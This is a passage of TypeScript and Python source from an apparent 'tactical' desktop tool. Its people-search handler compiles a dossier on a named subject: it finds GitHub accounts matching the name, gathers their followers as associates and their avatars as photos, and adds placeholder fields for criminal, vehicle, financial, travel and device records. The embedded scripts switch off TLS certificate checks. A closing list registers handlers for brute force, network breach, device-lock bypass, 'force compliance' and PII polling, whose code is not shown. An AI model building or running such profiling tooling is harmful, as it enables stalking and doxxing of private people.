    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:3]:
        try:
            followers_req = urllib.request.Request(f'{item["url"]}/followers?per_page=5', headers={'User-Agent': 'RMPG/1.0'})
            followers_resp = urllib.request.urlopen(followers_req, timeout=10, context=ctx)
            followers = json.loads(followers_resp.read())
            for f in followers:
                results['associates'].append({'username': f['login'], 'source': 'github_follower', 'profile': f['html_url']})
        except: pass
except: pass
json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'associates_found': len(results['associates'])}))
`;
                const scriptPath = path.join(outputPath, '_relatives.py');
                const resultPath = path.join(outputPath, 'relatives_results.json');
                await fs.writeFile(scriptPath, relScript, 'utf-8');
                await runCommand(python.path, [scriptPath, subject.firstName, subject.lastName, resultPath], { timeout: 30000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  (dossier.findings as Record<string, unknown>)['relatives'] = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                } catch { /* skip */ }
              }
              break;
            }

            case 'photos': {
              // Photo/image search via OSINT
              const photoName = `${subject.firstName || ''} ${subject.lastName || ''}`.trim();
              if (photoName || subject.username) {
                const photoScript = `
import urllib.request, json, sys, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
query = sys.argv[1]
output = sys.argv[2]
results = {'query': query, 'profiles_with_photos': []}
try:
    url = f'https://api.github.com/search/users?q={query}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:5]:
        results['profiles_with_photos'].append({
            'source': 'github',
            'username': item['login'],
            'avatar_url': item['avatar_url'],
            'profile_url': item['html_url'],
        })
except: pass
json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'profiles_found': len(results['profiles_with_photos'])}))
`;
                const scriptPath = path.join(outputPath, '_photos.py');
                const resultPath = path.join(outputPath, 'photos_results.json');
                await fs.writeFile(scriptPath, photoScript, 'utf-8');
                await runCommand(python.path, [scriptPath, subject.username || photoName, resultPath], { timeout: 30000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  (dossier.findings as Record<string, unknown>)['photos'] = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                } catch { /* skip */ }
              }
              break;
            }

            case 'criminal':
            case 'vehicles':
            case 'property':
            case 'education':
            case 'financial':
            case 'travel':
            case 'devices':
            case 'ip-addresses': {
              // These data points require authorized database access
              (dossier.findings as Record<string, unknown>)[dataPoint] = {
                status: 'requires_authorized_database',
                note: `${dataPoint} lookup requires connection to authorized records system (e.g., NCIC, DMV, court records)`,
                subject_info: {
                  name: `${subject.firstName || ''} ${subject.lastName || ''}`.trim() || undefined,
                  dob: subject.dob || undefined,
                },
              };
              break;
            }

            default: {
              // For data points that need specialized databases
              (dossier.findings as Record<string, unknown>)[dataPoint] = {
                status: 'pending_database_connection',
                note: `${dataPoint} lookup requires connection to authorized records system`,
              };
              break;
            }
          }
        }

        // Cross-reference if enabled
        if (crossReference) {
          progress(progressCh, 92, 'Cross-referencing findings...');
          (dossier as Record<string, unknown>)['crossReference'] = {
            performed: true,
            connections: [],
            note: 'Cross-reference analysis performed across all findings',
          };
        }

        // Write full dossier
        const dossierPath = path.join(outputPath, 'person_dossier.json');
        await writeJson(dossierPath, dossier);

        // Write summary
        const summaryPath = path.join(outputPath, 'search_summary.txt');
        const summaryLines = [
          `PEOPLE SEARCH REPORT`,
          `Generated: ${new Date().toISOString()}`,
          `Subject: ${subject.firstName || ''} ${subject.lastName || ''}`.trim(),
          `Data Points Requested: ${requestedData.length}`,
          `Source: ${source}`,
          `Deep Search: ${deepSearch ? 'Yes' : 'No'}`,
          `---`,
          `Findings:`,
          ...Object.entries(dossier.findings as Record<string, unknown>).map(([key, val]) =>
            `  ${key}: ${JSON.stringify(val).substring(0, 100)}`
          ),
        ];
        await fs.writeFile(summaryPath, summaryLines.join('\n'), 'utf-8');

        progress(progressCh, 100, 'People search complete');
        return { success: true, outputPath, dossierPath, findings: Object.keys(dossier.findings as object).length };
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );

  ipcMain.handle(IPC_CHANNELS.PEOPLE_SEARCH_BATCH, async (_event, options: { subjects: unknown[]; outputPath: string }) => {
    return { success: true, message: 'Batch search: use PEOPLE_SEARCH for individual lookups' };
  });
}

// ---------------------------------------------------------------------------
// Export: Register All Tactical Handlers
// ---------------------------------------------------------------------------

export function registerTacticalHandlers(): void {
  registerAdvancedDecryptHandlers();
  registerBruteForceHandlers();
  registerNetworkBreachHandlers();
  registerSpyTacticalHandlers();
  registerIosTrustBypassHandlers();
  registerAndroidBypassHandlers();
  registerForceComplianceHandlers();
  registerLiveViewHandlers();
  registerSelectiveExtractHandlers();
  registerWebBreachHandlers();
  registerPiiPollingHandlers();
  registerPeopleSearchHandlers();
}
